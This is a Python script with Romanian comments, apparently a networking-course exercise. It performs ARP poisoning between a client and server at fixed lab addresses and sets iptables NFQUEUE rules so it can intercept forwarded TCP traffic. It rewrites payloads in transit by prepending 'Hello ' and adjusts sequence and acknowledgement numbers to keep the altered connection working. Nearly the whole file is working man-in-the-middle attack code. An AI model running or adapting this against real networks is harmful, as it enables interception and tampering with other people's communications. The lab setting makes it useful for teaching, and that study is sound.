# cod preluat de la exercitiu anterior ARP poisoin pentru interceptarea mesajelor dintre client si server
# + cod din link-urile ajutatoare din curs oferite pentru exercitiul 4 modificat pentru contextul nostru + implementari gasite pe net

from scapy.all import *
import os
import signal
import sys
import threading
import time
from netfilterqueue import NetfilterQueue as NFQ

# Parametrii pentru Middle-Man in procesul de otravire ARP al retelei 
gateway_ip = "198.7.0.2"
target_ip = "198.7.0.1"
packet_count = 1000
conf.iface = "eth0"
conf.verb = 1

# Trimitem un ARP request pentru o adresa IP data si asteptam un ARP reply cu adresa MAC asociata 
def get_mac(ip_address):
    # ARP request 
    # Functia sr trimite si primeste un pachet layer 3
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

# Inversam procesul de otravire ARP si restauram reteaua
# Trimitem ARP reply-ul cu adresa MAC reala si informatiile despre adresa IP
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    # Dezactivam redirectionarea de ip-uri de pe sist. de operare
    os.system("sysctl -w net.inet.ip.forwarding=0")
    # Oprim procesul
    os.kill(os.getpid(), signal.SIGTERM)

# Trimitem ARP reply-uri false pentru ca pachetele sa fie interceptate de procesul din mijloc creat (Attacker Man-In-Middle)
# Vom folosi adresa noastra MAC ca hwsrc pentru ARP reply-uri
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

# Flag-uri TCP
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

# dicționar în care cheile sunt numerele de secvență originale ale pachetelor TCP, iar valorile corespunzătoare sunt numerele de secvență modificate
proccesed_sequences = {}

# dicționar în care cheile sunt numerele de confirmare originale ale pachetelor TCP, iar valorile corespunzătoare sunt numerele de confirmare modificate
proccesed_acknowledges= {}

client_ip = "198.7.0.1"
server_ip = "198.7.0.2"

# funcție care modifică layer-ul de IP dintr-un pachet si care va fi apelată pentru fiecare pachet din coada NFQUEUE
# are ca scop modificarea conținutului pachetului în tranzit
def alter_packet(packet):
    global client_ip
    global server_ip
    global proccesed_sequences 
    global proccesed_acknowledges

    octets = packet.get_payload()
    scapy_packet = IP(octets)

    if scapy_packet.haslayer(TCP) and (scapy_packet[IP].src == client_ip or scapy_packet[IP].src == server_ip):

        beforeSequence = scapy_packet['TCP'].seq
        beforeAcknowledge = scapy_packet['TCP'].ack

        if beforeSequence in proccesed_sequences.keys():
            afterSequence = proccesed_sequences[beforeSequence]
        else: 
            afterSequence = beforeSequence
        
        if beforeAcknowledge in proccesed_acknowledges.keys():
            afterAcknowledge = proccesed_acknowledges[beforeAcknowledge] 
        else:
            afterAcknowledge = beforeAcknowledge


        print("Pachet inainte:")
        print(scapy_packet[IP].show())
    
        flags = scapy_packet['TCP'].flags
        msg = scapy_packet['TCP'].payload
        if flags & PSH:
            msg = scapy.packet.Raw(b'Hello ' + bytes(scapy_packet[TCP].payload))

        proccesed_sequences[beforeSequence + len(scapy_packet['TCP'].payload)] = afterSequence + len(msg)
        proccesed_acknowledges[afterSequence + len(msg)] = beforeSequence + len(scapy_packet['TCP'].payload)

        new_packet = IP(
            src=scapy_packet[IP].src,
            dst=scapy_packet[IP].dst
        ) / TCP(
            sport=scapy_packet[TCP].sport,
            dport=scapy_packet[TCP].dport,
            seq=afterSequence,
            ack=afterAcknowledge,
            flags=scapy_packet[TCP].flags
        ) / (msg)

        print("Pachet dupa:")
        print(new_packet[IP].show())
        send(new_packet)
    
    else:
        send(scapy_packet)

# Pornim script-ul 
print("[*] Starting script: arp_poison.py")
print("[*] Enabling IP forwarding")
# Activam redirectionarea de ip-uri
os.system("sysctl -w net.inet.ip.forwarding=1")
print(f"[*] Gateway IP address: {gateway_ip}")
print(f"[*] Target IP address: {target_ip}")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC address: {gateway_mac}")

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Target MAC address: {target_mac}")

# Cream thread-ul de otravire ARP
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

# "Adulmecam" traficul de date si scriem in fisier. Captura este filtrata pe masina destinatie
try:
    sniff_filter = "ip host " + target_ip
    print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
    
    print("Started to alter packages")
    queue = NFQ()
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    
    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
    queue.bind(10, alter_packet)
    queue.run()        
    
    wrpcap(target_ip + "_capture.pcap", packets)
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()
    print("failed")
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)